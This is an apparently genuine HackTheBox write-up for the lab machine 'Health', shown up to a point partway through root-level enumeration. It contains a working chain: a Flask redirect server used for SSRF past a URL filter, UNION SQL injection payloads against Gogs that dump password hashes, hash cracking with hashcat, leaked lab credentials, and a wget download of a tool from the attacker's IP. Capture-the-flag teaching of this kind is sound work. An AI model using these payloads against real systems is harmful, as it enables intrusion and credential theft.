---
title: HTB: Health
url: https://0xdf.gitlab.io/2023/01/07/htb-health.html
date: 2023-01-07T14:45:00+00:00
difficulty: Medium [30]
os: Linux
tags: ctf, htb-health, hackthebox, nmap, feroxbuster, laravel, redirect, hook, gogs, ssrf, python, flask, sqli, sqli-union, sqlite, sqli-sqlite, hashcat, sha256, chatgpt, htb-ransom
---

![Health](https://0xdfimages.gitlab.io/img/health-cover.png)

Health originally released as easy, but was bumped up to Medium three days later. That’s because there’s a tricky SQL injection that you have to exploit via a redirect, which eliminates things like sqlmap. After using the SSRF into redirect to exploit Gogs and leak the user table, I’ll crack the hash and get SSH access to the box. For root, I’ll exploit a cron that runs through the website by generating tasks directly in the database, bypassing the filtering on the website.

## Box Info

| Name | [Health](https://hackthebox.com/machines/health)  [Health](https://hackthebox.com/machines/health) [Play on HackTheBox](https://hackthebox.com/machines/health) |
| --- | --- |
| Release Date | [20 Aug 2022](https://twitter.com/hackthebox_eu/status/1560280370981240833) |
| Retire Date | 07 Jan 2023 |
| OS | Linux Linux |
| Base Points | Medium [30] |
| Rated Difficulty | Rated difficulty for Health |
| Radar Graph | Radar chart for Health |
| First Blood User | 01:48:43[jazzpizazz jazzpizazz](https://app.hackthebox.com/users/87804) |
| First Blood Root | 01:57:33[jazzpizazz jazzpizazz](https://app.hackthebox.com/users/87804) |
| Creator | [irogir irogir](https://app.hackthebox.com/users/476556) |

## Recon

### nmap

`nmap` finds two open TCP ports, SSH (22) and two HTTP (80), and a filtered port 3000:

```

oxdf@hacky$ nmap -p- --min-rate 10000 10.10.11.176
Starting Nmap 7.80 ( https://nmap.org ) at 2023-01-06 20:29 UTC
Nmap scan report for 10.10.11.176
Host is up (0.087s latency).
Not shown: 65532 closed ports
PORT     STATE    SERVICE
22/tcp   open     ssh
80/tcp   open     http
3000/tcp filtered ppp

Nmap done: 1 IP address (1 host up) scanned in 7.32 seconds

oxdf@hacky$ nmap -p 22,80 -sCV 10.10.11.176
Starting Nmap 7.80 ( https://nmap.org ) at 2023-01-06 20:31 UTC
Nmap scan report for 10.10.11.176
Host is up (0.087s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 32:b7:f4:d4:2f:45:d3:30:ee:12:3b:03:67:bb:e6:31 (RSA)
|   256 86:e1:5d:8c:29:39:ac:d7:e8:15:e6:49:e2:35:ed:0c (ECDSA)
|_  256 ef:6b:ad:64:d5:e4:5b:3e:66:79:49:f4:ec:4c:23:9f (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: HTTP Monitoring Tool
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.00 seconds

```

Based on the [OpenSSH](https://packages.ubuntu.com/search?keywords=openssh-server) and [Apache](https://packages.ubuntu.com/search?keywords=apache2) versions, the host is likely running Ubuntu Bionic 18.04, which is somewhat old at this point.

### Website - TCP 80

#### Site

The page is for a service that allows users to monitor the health of other sites:

[![image-20230106153430094](https://0xdfimages.gitlab.io/img/image-20230106153430094.png)](https://0xdfimages.gitlab.io/img/image-20230106153430094.png)

[*Click for full image*](https://0xdfimages.gitlab.io/img/image-20230106153430094.png)

There are multiple references to `health.htb`, so I’ll add that to my `/etc/hosts` file.

I’ll try to set up a webhook monitoring `health.htb`:

![image-20230106153729062](https://0xdfimages.gitlab.io/img/image-20230106153729062.png)

It doesn’t like having `health.htb` or `10.10.11.176` in the monitored URL:

![image-20230106153825956](https://0xdfimages.gitlab.io/img/image-20230106153825956.png)

I am able to use my IP. I can “Test” and it reports failure (without having anything listening to get this), and I can “Create”, and it report success:

![image-20230106194547322](https://0xdfimages.gitlab.io/img/image-20230106194547322.png)

#### Tech Stack

Looking at the HTTP response headers, there’s a `laravel_session` cookie set:

```

HTTP/1.1 200 OK
Date: Fri, 06 Jan 2023 20:37:47 GMT
Server: Apache/2.4.29 (Ubuntu)
Cache-Control: no-cache, private
Set-Cookie: XSRF-TOKEN=eyJpdiI6Ijk4NGx1ZG4wVU9BTkg3Nzd4ejhHQVE9PSIsInZhbHVlIjoiQ1FyMVJLZzg0Zit2UWNEa1p1ZlVOWVZmSnR2Z2JlUTMwa1gxYytrVjgxZzlmT0RhaEg2RFlNQVdRcmxVeUFGTmUyd1FDVW5FT2RjOTlqeWx1R3ZGeWo4bzdqMEN3K00wYndGSEV4RXY4VllCU3gvVTB2VGxRK0hwcloybjJGQ1oiLCJtYWMiOiJmMzA5NTc5ZjgyYzFkZTljODIyMDUzMDkyZTQyYmZhOWIzNDgxMjMyMzdmYzhmY2Q4NmEzMjcwOWZiNDM4YjRjIiwidGFnIjoiIn0%3D; expires=Fri, 06-Jan-2023 22:37:48 GMT; Max-Age=7200; path=/; samesite=lax
Set-Cookie: laravel_session=eyJpdiI6InRhMWp5MEdzTDgybnVPc1l1QkZ1OHc9PSIsInZhbHVlIjoiazh4am54eTZRbFpER3BOS0t6U1pHeTduSEVhYUo2RXdoSXRobXFLQTVWS2liRkcrUHN5THV5TmJGTEh6NXB6VzNLVlNpMnVIVElPWGRmZDBuZFNXQTJqNmRqZTBYYlAvenE1dXpmNFZ4QkZ2ZlRPcHQwdjRGb2FDQkI4R0lHbDEiLCJtYWMiOiJiOTc4NzI4ODI1YWY3ZDI2ODhlMmZkYWNiMjU4NjcxMTU1YjI2OTZiZjA4ZWFhYWU5NWY5ZjEyOGNhZGQyM2NiIiwidGFnIjoiIn0%3D; expires=Fri, 06-Jan-2023 22:37:48 GMT; Max-Age=7200; path=/; httponly; samesite=lax
Vary: Accept-Encoding
Content-Length: 7501
Connection: close
Content-Type: text/html; charset=UTF-8

```

That indicates this is a PHP server using the Laravel framework. The PHP part is confirmed when I get `/index.php` and it loads the main page, but `/index.html` returns 404.

#### Directory Brute Force

I’ll run `feroxbuster` against the site, and include `-x php` since I know the site is PHP, but it doesn’t find anything of interest.

### Subdomain Brute Force

Given the use of `health.htb` on the website, I’ll do a brute force to see if setting the host header to any subdomains returns a different page. I’ll filter responses that are 620 words in length (based on running it for a couple seconds with no filter and noting the default size), and it does not find anything (that one result is a false positive):

```

oxdf@hacky$ wfuzz -u http://10.10.11.176 -H "Host: FUZZ.health.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --hw 620
********************************************************
* Wfuzz 2.4.5 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.11.176/
Total requests: 4989

===================================================================
ID           Response   Lines    Word     Chars       Payload
===================================================================

000000689:   400        10 L     35 W     301 Ch      "gc._msdcs"

Total time: 79.69692
Processed Requests: 4989
Filtered Requests: 4988
Requests/sec.: 62.59965

```

## Shell as susanne

### Enumerate Requests

I’ll try the webhook setup again with my IP for both URLs:

![image-20230106153940610](https://0xdfimages.gitlab.io/img/image-20230106153940610.png)

Both URLs are requested:

```

oxdf@hacky$ python -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.176 - - [06/Jan/2023 20:39:45] code 404, message File not found
10.10.11.176 - - [06/Jan/2023 20:39:45] "GET /hook HTTP/1.0" 404 -
10.10.11.176 - - [06/Jan/2023 20:39:45] code 501, message Unsupported method ('POST')
10.10.11.176 - - [06/Jan/2023 20:39:45] "POST /payload HTTP/1.1" 501 -

```

I want to figure out more about what is making the requests. I’ll start `nc` listening on both 80 and 8000, and submit this:

![image-20230106155924850](https://0xdfimages.gitlab.io/img/image-20230106155924850.png)

Immediately there’s a GET on 80:

```

oxdf@hacky$ nc -lnvp 8000
Listening on 0.0.0.0 80
Connection received on 10.10.11.176 51326
GET / HTTP/1.0
Host: 10.10.14.6:80
Connection: close

```

When I CTRL-c that window, there’s a request on 8000:

```

oxdf@hacky$ nc -lnvp 80
Listening on 0.0.0.0 8000
Connection received on 10.10.11.176 36746
POST / HTTP/1.1
Host: 10.10.14.6:8000
Accept: */*
Content-type: application/json
Content-Length: 97

{"webhookUrl":"http:\/\/10.10.14.6:80","monitoredUrl":"http:\/\/10.10.14.6:8000","health":"down"}

```

Neither request has a User-Agent, so I can’t use that to figure out what is making the request.

To see what it looks like when the GET is successful, I’ll use Python on 80, and still `nc` on 8000, and submit. The POST looks like:

```

POST / HTTP/1.1
Host: 10.10.14.6:8000
Accept: */*
Content-type: application/json
Content-Length: 877

{"webhookUrl":"http:\/\/10.10.14.6:8000","monitoredUrl":"http:\/\/10.10.14.6","health":"up","body":"<!DOCTYPE HTML PUBLIC \"-\/\/W3C\/\/DTD HTML 4.01\/\/EN\" \"http:\/\/www.w3.org\/TR\/html4\/strict.dtd\">\n<html>\n<head>\n<meta http-equiv=\"Content-Type\" content=\"text\/html; charset=utf-8\">\n<title>Directory listing for \/<\/title>\n<\/head>\n<body>\n<h1>Directory listing for \/<\/h1>\n<hr>\n<ul>\n<li><a href=\"assets\/\">assets\/<\/a><\/li>\n<li><a href=\"ferox-http_10_10_11_176-1673037912.state\">ferox-http_10_10_11_176-1673037912.state<\/a><\/li>\n<li><a href=\"health.md\">health.md<\/a><\/li>\n<li><a href=\"scans\/\">scans\/<\/a><\/li>\n<\/ul>\n<hr>\n<\/body>\n<\/html>\n","message":"HTTP\/1.0 200 OK","headers":{"Server":"SimpleHTTP\/0.6 Python\/3.8.10","Date":"Fri, 06 Jan 2023 20:58:38 GMT","Content-type":"text\/html; charset=utf-8","Content-Length":"521"}}

```

It gives the full content of the page!

### Access Gogs

#### Test Redirect

I’d like to see what’s on that port 3000 that’s filtered when I run `nmap`. The filtering implies that the port is open, just blocked by a firewall. But I can’t give the site a URL that has it’s own IP in it.

I’ll see if the client making these web requests follows redirects. I’ll write a short Flask web server:

```

from flask import Flask, redirect, request

app = Flask(__name__)

@app.route("/redirect", methods=["GET"])
def redir():
    return redirect('http://10.10.14.6/test')

@app.route("/test", methods=["GET"])
def test():
    return ("Hello!", 200)

@app.route("/hook", methods=["POST"])
def hook():
    print("Got Hook!")
    print(request.json)
    return ('', 200)

if __name__ == "__main__":
    app.run(debug=True, host="0.0.0.0", port=80)

```

This code defines three end points. A GET request to `/redirect` will return a redirect to `http://10.10.14.6/test`. a GET to `/test` will return “Hello!”. If that works, there will be a POST to `/hook`, which will print success and the body.

When I run this, I get:

```
10.10.11.176 - - [06/Jan/2023 21:15:11] "GET /redirect HTTP/1.0" 302 -
10.10.11.176 - - [06/Jan/2023 21:15:11] "GET /test HTTP/1.0" 200 -
Got Hook!
{'webhookUrl': 'http://10.10.14.6/hook', 'monitoredUrl': 'http://10.10.14.6/redirect', 'health': 'up', 'body': 'Hello!', 'message': 'HTTP/1.0 302 FOUND', 'headers': {'Content-Type': 'text/html; charset=utf-8', 'Content-Length': '6', 'Location': 'http://10.10.14.6/test', 'Server': 'Werkzeug/2.0.2 Python/3.8.10', 'Date': 'Fri, 06 Jan 2023 21:15:11 GMT'}}
10.10.11.176 - - [06/Jan/2023 21:15:11] "POST /hook HTTP/1.1" 200 -

```

It worked! It read my different page and returned by body after a redirect.

#### Redirect to Health

I still haven’t proven that this won’t get blocked if I try to reach `health.htb`. I’ll update the server to redirect to `http://127.0.0.1/`, and submit expecting to get `http://health.htb`:

On hitting test, there’s a GET, and then a POST:

```
10.10.11.176 - - [06/Jan/2023 21:18:53] "POST /hook HTTP/1.1" 200 -                                                     10.10.11.176 - - [06/Jan/2023 21:20:30] "GET /redirect?r=http://127.0.0.1 HTTP/1.0" 302 -                               Got Hook!                                                                                                               {'webhookUrl': 'http://10.10.14.6/hook', 'monitoredUrl': 'http://10.10.14.6/redirect?r=http://127.0.0.1', 'health': 'up', 'body': '<!DOCTYPE html>\n<html lang="en">\n<head>\n    <meta charset="UTF-8">\n    <meta name="viewport" content="width=device-width, initial-scale=1.0">\n
...[snip]...
expires=Fri, 06-Jan-2023 23:20:30 GMT; Max-Age=7200; path=/; httponly; samesite=lax', 'Vary': 'Accept-Encoding', 'Connection': 'close'}}
10.10.11.176 - - [06/Jan/2023 21:20:30] "POST /hook HTTP/1.1" 200 -

```

That seems to be the body of `health.htb`, which means I’ve bypassed the filter.

#### Read Port 3000

I’ll update and submit with the redirect pointing to `http://127.0.0.1:3000`, and I get a hit. There’s a ton of HTML, but right away I can see the title says “Gogs”:

![image-20230106162339340](https://0xdfimages.gitlab.io/img/image-20230106162339340.png)

Towards the footer, there’s a version:

![image-20230106162431868](https://0xdfimages.gitlab.io/img/image-20230106162431868.png)

### SQL Injection

#### Identify

There’s an SQL injection vulnerability in this version of Gogs, [CVE-2014-8682](https://github.com/advisories/GHSA-g6xv-8q23-w2q3). This [exploitDB](https://www.exploit-db.com/exploits/35238) entry has a few payloads for this. I’ll start with this one as it seems the simplest to understand what it is doing:

```

http://www.example.com/api/v1/users/search?q='/**/and/**/false)/**/union/**/
select/**/null,null,@@version,null,null,null,null,null,null,null,null,null,null,
null,null,null,null,null,null,null,null,null,null,null,null,null,null/**/from
/**/mysql.db/**/where/**/('%25'%3D'

```

There’s a UNION injection. The table it should be reading from clearly has 27 columns, which the POC is filling with mostly `null`, but putting the version in the third column. That’s because that’s one of the columns that is displayed back in the output. It also seems like it can’t use spaces, but is using `/**/` instead.

#### POC

I’ll test this out by updating the payload to point to Health’s Gogs just like this, but it doesn’t work.

I’m going to simplify the payload a bit:

```

    target = "http://127.0.0.1:3000/api/v1/users/search?q=')/**/union/**/all/**/select/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27--/**/-"
    return redirect(target)

```

This should just try to read numbers into the query, and it works:

```
10.10.11.176 - - [06/Jan/2023 22:04:10] "GET /redirect HTTP/1.0" 302 -
Got Hook!
{'webhookUrl': 'http://10.10.14.6/hook', 'monitoredUrl': 'http://10.10.14.6/redirect', 'health': 'up', 'body': '{"data":[{"username":"susanne","avatar":"//1.gravatar.com/avatar/c11d48f16f254e918744183ef7b89fce"},{"username":"3","avatar":"//1.gravatar.com/avatar/15"}],"ok":true}', 'message': 'HTTP/1.0 302 FOUND', 'headers': {'Content-Type': 'application/json; charset=UTF-8', 'Content-Length': '166', 'Location': "http://127.0.0.1:3000/api/v1/users/search?q=')/**/union/**/all/**/select/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27--/**/-", 'Server': 'Werkzeug/2.0.2 Python/3.8.10', 'Date': 'Fri, 06 Jan 2023 22:04:10 GMT', 'Set-Cookie': '_csrf=; Path=/; Max-Age=0'}}
10.10.11.176 - - [06/Jan/2023 22:04:10] "POST /hook HTTP/1.1" 200 -

```

It’s giving info about “susanne” as well as about “3”.

#### Id Database

If I try to replace `3` with `version()`, it fails. That implies the DB may not be MySQL. SQLite uses `sqlite_version()`, and putting that in works:

```
10.10.11.176 - - [06/Jan/2023 22:09:04] "GET /redirect HTTP/1.0" 302 -
Got Hook!
{'webhookUrl': 'http://10.10.14.6/hook', 'monitoredUrl': 'http://10.10.14.6/redirect', 'health': 'up', 'body': '{"data":[{"username":"susanne","avatar":"//1.gravatar.com/avatar/c11d48f16f254e918744183ef7b89fce"},{"username":"3.8.5","avatar":"//1.gravatar.com/avatar/15"}],"ok":true}', 'message': 'HTTP/1.0 302 FOUND', 'headers': {'Content-Type': 'application/json; charset=UTF-8', 'Content-Length': '170', 'Location': "http://127.0.0.1:3000/api/v1/users/search?q=')/**/union/**/all/**/select/**/1,2,sqlite_version(),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27--/**/-", 'Server': 'Werkzeug/2.0.2 Python/3.8.10', 'Date': 'Fri, 06 Jan 2023 22:09:04 GMT', 'Set-Cookie': '_csrf=; Path=/; Max-Age=0'}}
10.10.11.176 - - [06/Jan/2023 22:09:04] "POST /hook HTTP/1.1" 200 -

```

It’s running SQLite version 3.8.5.

#### Run Gogs Locally

To get this to work, I’ll need to get Gogs running locally. I’ll download this version form the [release page](https://github.com/gogs/gogs/releases/tag/v0.5.5). It’s a zip with a compiled binary in it. I’ll run `./gogs web`, and it starts the web server.

Visiting `127.0.0.1:3000` presents the install page:

![image-20230106171650744](https://0xdfimages.gitlab.io/img/image-20230106171650744.png)

I’ll leave the DB as it is (matching what Health is using, SQLite), and make an admin user. Once I do that, It says it works, and I get the login:

![image-20230106171842889](https://0xdfimages.gitlab.io/img/image-20230106171842889.png)

Pasting my query into Firefox, it works:

![image-20230106172224759](https://0xdfimages.gitlab.io/img/image-20230106172224759.png)

#### Enumerate Users Table

It says it made the DB in `data/gogs.db`. I’ll check that out:

```

oxdf@hacky$ sqlite3 data/gogs.db 
SQLite version 3.31.1 2020-01-27 19:55:54
Enter ".help" for usage hints.
sqlite> .schema user
CREATE TABLE `user` (`id` INTEGER PRIMARY KEY AUTOINCREMENT NOT NULL, `lower_name` TEXT NOT NULL, `name` TEXT NOT NULL, `full_name` TEXT NULL, `email` TEXT NOT NULL, `passwd` TEXT NOT NULL, `login_type` INTEGER NULL, `login_source` INTEGER NOT NULL DEFAULT 0, `login_name` TEXT NULL, `type` INTEGER NULL, `num_followers` INTEGER NULL, `num_followings` INTEGER NULL, `num_stars` INTEGER NULL, `num_repos` INTEGER NULL, `avatar` TEXT NOT NULL, `avatar_email` TEXT NOT NULL, `location` TEXT NULL, `website` TEXT NULL, `is_active` INTEGER NULL, `is_admin` INTEGER NULL, `rands` TEXT NULL, `salt` TEXT NULL, `created` NUMERIC NULL, `updated` NUMERIC NULL, `description` TEXT NULL, `num_teams` INTEGER NULL, `num_members` INTEGER NULL);
CREATE UNIQUE INDEX `UQE_user_name` ON `user` (`name`);
CREATE UNIQUE INDEX `UQE_user_email` ON `user` (`email`);
CREATE UNIQUE INDEX `UQE_user_lower_name` ON `user` (`lower_name`);

```

Those are the 27 columns I noticed in the exploit. `name` is the third column.

I want the name, email, password, and salt for each user. I’ll update the query, using `||` to concatenate in SQLite:

```

http://127.0.0.1:3000/api/v1/users/search?q=')/**/union/**/all/**/select/**/1,2,name||':'||email||':'||passwd||':'||salt,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27/**/from/**/user--/**/-

```

This works locally:

![image-20230106172659400](https://0xdfimages.gitlab.io/img/image-20230106172659400.png)

#### Get Hash

I’ll update the script to get this same URL on Health:

```

from flask import Flask, redirect, request

app = Flask(__name__)

@app.route("/redirect", methods=["GET"])
def redir():
    #target = "http://127.0.0.1:3000/api/v1/users/search?q=')/**/union/**/all/**/select/**/1,2,sqlite_version(),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27--/**/-"
    target = "http://127.0.0.1:3000/api/v1/users/search?q=')/**/union/**/all/**/select/**/1,2,name||':'||email||':'||passwd||':'||salt,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27/**/from/**/user--/**/-"
    return redirect(target)

@app.route("/test", methods=["GET"])
def test():
    return ("Hello!", 200)

@app.route("/hook", methods=["POST"])
def hook():
    print("Got Hook!")
    print(request.json)
    return ('', 200)

if __name__ == "__main__":
    app.run(debug=True, host="0.0.0.0", port=80)

```

I get the following back:

```
10.10.11.176 - - [06/Jan/2023 22:27:43] "GET /redirect HTTP/1.0" 302 -
Got Hook!
{'webhookUrl': 'http://10.10.14.6/hook', 'monitoredUrl': 'http://10.10.14.6/redirect', 'health': 'up', 'body': '{"data":[{"username":"susanne","avatar":"//1.gravatar.com/avatar/c11d48f16f254e918744183ef7b89fce"},{"username":"susanne:admin@gogs.local:66c074645545781f1064fb7fd1177453db8f0ca2ce58a9d81c04be2e6d3ba2a0d6c032f0fd4ef83f48d74349ec196f4efe37:sO3XIbeW14","avatar":"//1.gravatar.com/avatar/15"}],"ok":true}', 'message': 'HTTP/1.0 302 FOUND', 'headers': {'Content-Type': 'application/json; charset=UTF-8', 'Content-Length': '301', 'Location': "http://127.0.0.1:3000/api/v1/users/search?q=')/**/union/**/all/**/select/**/1,2,name||':'||email||':'||passwd||':'||salt,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27/**/from/**/user--/**/-", 'Server': 'Werkzeug/2.0.2 Python/3.8.10', 'Date': 'Fri, 06 Jan 2023 22:27:43 GMT', 'Set-Cookie': '_csrf=; Path=/; Max-Age=0'}}
10.10.11.176 - - [06/Jan/2023 22:27:43] "POST /hook HTTP/1.1" 200 -

```

This includes:
- user: susanne
- email: admin@gogs.local
- hash: 66c074645545781f1064fb7fd1177453db8f0ca2ce58a9d81c04be2e6d3ba2a0d6c032f0fd4ef83f48d74349ec196f4efe37
- salt: sO3XIbeW14

### Crack Hash

Gogs uses a PBKDF2-HMAC-SHA256 hash, which is type 10900 on [Hashcat](https://hashcat.net/wiki/doku.php?id=example_hashes). The data needs to be converted from hex to base64:

```

oxdf@hacky$ echo "66c074645545781f1064fb7fd1177453db8f0ca2ce58a9d81c04be2e6d3ba2a0d6c032f0fd4ef83f48d74349ec196f4efe37" | xxd -r -p | base64 -w0
ZsB0ZFVFeB8QZPt/0Rd0U9uPDKLOWKnYHAS+Lm07oqDWwDLw/U74P0jXQ0nsGW9O/jc=
box/health-10.10.11.176]$ echo -n "sO3XIbeW14" | base64
c08zWEliZVcxNA==

```

I also need to know the number of rounds. ChatGPT tells me:

![image-20230106173945860](https://0xdfimages.gitlab.io/img/image-20230106173945860.png)

The resulting hash is:

```

sha256:10000:c08zWEliZVcxNA==:ZsB0ZFVFeB8QZPt/0Rd0U9uPDKLOWKnYHAS+Lm07oqDWwDLw/U74P0jXQ0nsGW9O/jc=

```

Passing that to `hashcat` cracks it with `rockyout.txt` in a less than a minute:

```

$ hashcat susanne.hash /usr/share/wordlists/rockyou.txt 
hashcat (v6.2.6) starting in autodetect mode
...[snip]...
Hash-mode was not specified with -m. Attempting to auto-detect hash mode.
The following mode was auto-detected as the only one matching your input hash:

10900 | PBKDF2-HMAC-SHA256 | Generic KDF
...[snip]...
sha256:10000:c08zWEliZVcxNA==:ZsB0ZFVFeB8QZPt/0Rd0U9uPDKLOWKnYHAS+Lm07oqDWwDLw/U74P0jXQ0nsGW9O/jc=:february15

```

### SSH

With susanne’s username and password, I might as well try SSH, and it works:

```

oxdf@hacky$ sshpass -p february15 ssh susanne@health.htb
...[snip]...
susanne@health:~$

```

And I can read `user.txt`:

```

susanne@health:~$ cat user.txt
3306ec8d************************

```

## Shell as root

### Enumeration

#### Web

There is another home directory on the box, but it’s just Gogs. There’s nothing super interesting in susanne’s home directory.

The website files are kept in `/var/www/html`:

```

susanne@health:/var/www/html$ ls
app            composer.lock  package.json  resources   tests
artisan        config         phpunit.xml   routes      vendor
bootstrap      database       public        server.php  webpack.mix.js
composer.json  node_modules   README.md     storage

```

The `.env` file has the creds for the database:

```

DB_CONNECTION=mysql
DB_HOST=127.0.0.1
DB_PORT=3306
DB_DATABASE=laravel
DB_USERNAME=laravel
DB_PASSWORD=MYsql_strongestpass@2014+

```

#### Crons

I’ll start a Python webserver hosting [pspy](https://github.com/DominicBreuker/pspy), and upload it to Health:

```

susanne@health:/dev/shm$ wget 10.10.14.6/pspy64
--2023-01-06 22:49:17--  http://10.10.14.6/pspy64
Connecting to 10.10.14.6:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3078592 (2.9M) [application/octet-stream]
Saving to: ‘pspy64’

pspy64                100%[=========================>]   2.94M  2.21MB/s    in 1.3s    

2023-01-06 22:49:18 (2.21 MB/s) - ‘pspy64’ saved [3078592/3078592]

```

I’ll make it executable, and run it. After showing the running processes, I’ll look for processes starting around the new minute. There are several running every minute:

```

2023/01/06 22:51:01 CMD: UID=0    PID=4920   | /bin/bash -c sleep 5 && /root/meta/clean.sh 
2023/01/06 22:51:01 CMD: UID=0    PID=4919   | /bin/bash -c cd /var/www/html && php artisan schedule:run >> /dev/null 2>&1 
2023/01/06 22:51:01 CMD: UID=0    PID=4918   | /usr/sbin/CRON -f 
2023/01/06 22:51:01 CMD: UID=0    PID=4917   | /usr/sbin/CRON -f 
2023/01/06 22:51:01 CMD: UID=0    PID=4921   | sleep 5 
2023/01/06 22:51:01 CMD: UID=0    PID=4922   | /bin/bash -c cd /var/www/html && php artisan schedule:run >> /dev/null 2>&1 
2023/01/06 22:51:01 CMD: UID=0    PID=4925   | grep columns 
2023/01/06 22:51:01 CMD: UID=0    PID=4923   | sh -c stty -a | grep columns 
2023/01/06 22:51:01 CMD: UID=0    PID=4926   | php artisan schedule:run 
2023/01/06 22:51:01 CMD: UID=0    PID=4928   | grep columns 
2023/01/06 22:51:06 CMD: UID=0    PID=4929   | mysql laravel --execute TRUNCATE tasks

```

`artisan` is a utility used to interact with Laravel applications. It seems like root is running these `php artisan schedule:run` tasks.

### Web Source Review

#### Handling POST Requests

I did a more complete overview of Laravel apps in the [Beyond Root for Ransom](/2022/03/15/htb-ransom.html#beyond-root), which might be worth reviewing here.

`php artisan route:list` will show the various routes for this application:

```

susanne@health:/var/www/html$ php artisan route:list
+--------+----------+---------------------+---------+------------------------------------------------------------+------------------------------------------+
| Domain | Method   | URI                 | Name    | Action                                                     | Middleware                               |
+--------+----------+---------------------+---------+------------------------------------------------------------+------------------------------------------+
|        | GET|HEAD | /                   |         | Closure                                                    | web                                      |
|        | GET|HEAD | api/user            |         | Closure                                                    | api                                      |
|        |          |                     |         |                                                            | App\Http\Middleware\Authenticate:sanctum |
|        | GET|HEAD | sanctum/csrf-cookie |         | Laravel\Sanctum\Http\Controllers\CsrfCookieController@show | web                                      |
|        | POST     | webhook             | webhook | App\Http\Controllers\TaskController@create                 | web                                      |
|        | GET|HEAD | webhook/{id}        |         | Closure                                                    | web                                      |
+--------+----------+---------------------+---------+------------------------------------------------------------+------------------------------------------+

```

The route of particular interest here is a POST to `webhook`, which points to `App\Http\Controllers\TasksController@create`.

This function first gets the action and can delete a hook:

```

    /**
     * Show the form for creating a new resource.
     *
     * @return \Illuminate\Http\Response
     */
    public function create(Request $request)
    {

        $action = $request->action;

        if ($action === "Delete") {
            $id = $request->id;
            Task::destroy($id);
            return redirect("/")->with('message', 'The webhook was deleted!');
        }

```

Then it validates the input data:

```

        $validatedData = $request->validate([
            'webhookUrl' => ['required', 'url', new SafeUrlRule()],
            'monitoredUrl' => ['required', 'url', new SafeUrlRule()],
            'frequency' => 'required',
            'onlyError' => 'required|boolean'
        ]);

```

This is what prevents me from interacting with Health (`SafeUrlRule` can be found in `app/Rules/SafeUrlRule.php`).

If the `action` is “Test”, it calls `HealthChecker::check` right now:

```

       if ($action === "Test") {
            $res = HealthChecker::check($request->webhookUrl, $request->monitoredUrl, $request->onlyError);

            if (isset($res["health"]) && $res["health"] === "up") {
                return redirect("/")->with('message', 'The host is healthy!');
            } else {
                return redirect("/")->with('error', 'The host is not healthy!');
            }

```

Otherwise, it creates a `Task`:

```

        } else {
            $show = Task::create($validatedData);
            return redirect('/webhook/' . $show->id)->with('message', 'Webhook is successfully created');
        }
    }

```

At the top of the file, `Task` is imported:

```

<?php

namespace App\Http\Controllers;

use App\Models\Task;
use App\Rules\SafeUrlRule;
use Illuminate\Http\Request;

```

#### HealthChecker

When it calls `HealthChecker::check`, this is defined in `app/Http/Controllers/HealthChecker.php`. Interestingly, it is using `file_get_contents` to check the URL:

```

    public static function check($webhookUrl, $monitoredUrl, $onlyError = false)
    {

        $json = [];
        $json['webhookUrl'] = $webhookUrl;
        $json['monitoredUrl'] = $monitoredUrl;

        $res = @file_get_contents($monitoredUrl, false);

```

I didn’t realize that `file_get_contents` can be used to read a resource over HTTP, but [it can](https://www.php.net/manual/en/function.file-get-contents.php). The rest of the function is handling the results, doing the web hook, etc.

#### Storing Tasks

I’ll look at the `Task` object to see what happens when it’s created:

```

<?php

namespace App\Models;

use App\Traits\Uuids;
use Illuminate\Database\Eloquent\Factories\HasFactory;
use Illuminate\Database\Eloquent\Model;

class Task extends Model
{

    use Uuids;
    use HasFactory;

    protected $fillable = ['webhookUrl', 'monitoredUrl', 'frequency', 'onlyError'];

    public $incrementing = false;

    protected $keyType = 'string';

}

```

These models are basically wrappers onto database tables. I’ll connect with the creds from `.env` and verify:

```

susanne@health:/$ mysql -u laravel -p'MYsql_strongestpass@2014+' laravel
...[snip]...
mysql> show tables;
+------------------------+
| Tables_in_laravel      |
+------------------------+
| failed_jobs            |
| migrations             |
| password_resets        |
| personal_access_tokens |
| tasks                  |
| users                  |
+------------------------+
6 rows in set (0.00 sec)

```

There is a `tasks` table. It looks a lot like that model:

```

mysql> describe tasks;
+--------------+--------------+------+-----+---------+-------+
| Field        | Type         | Null | Key | Default | Extra |
+--------------+--------------+------+-----+---------+-------+
| id           | char(36)     | NO   | PRI | NULL    |       |
| webhookUrl   | varchar(255) | NO   |     | NULL    |       |
| onlyError    | tinyint(1)   | NO   |     | NULL    |       |
| monitoredUrl | varchar(255) | NO   |     | NULL    |       |
| frequency    | varchar(255) | NO   |     | NULL    |       |
| created_at   | timestamp    | YES  |     | NULL    |       |
| updated_at   | timestamp    | YES  |     | NULL    |       |
+--------------+--------------+------+-----+---------+-------+
7 rows in set (0.00 sec)

```

If I create a webhool, it is in the table:

```

mysql> select * from tasks;
+--------------------------------------+------------------------+-----------+----------------------------+-----------+---------------------+---------------------+
| id                                   | webhookUrl             | onlyError | monitoredUrl               | frequency | created_at          | updated_at          |
+--------------------------------------+------------------------+-----------+----------------------------+-----------+---------------------+---------------------+
| 2ab671ac-84b5-4f40-9757-4fb6c45150d2 | http://10.10.14.6/hook |         0 | http://10.10.14.6/redirect | * * * * * | 2023-01-07 00:58:52 | 2023-01-07 00:58:52 |
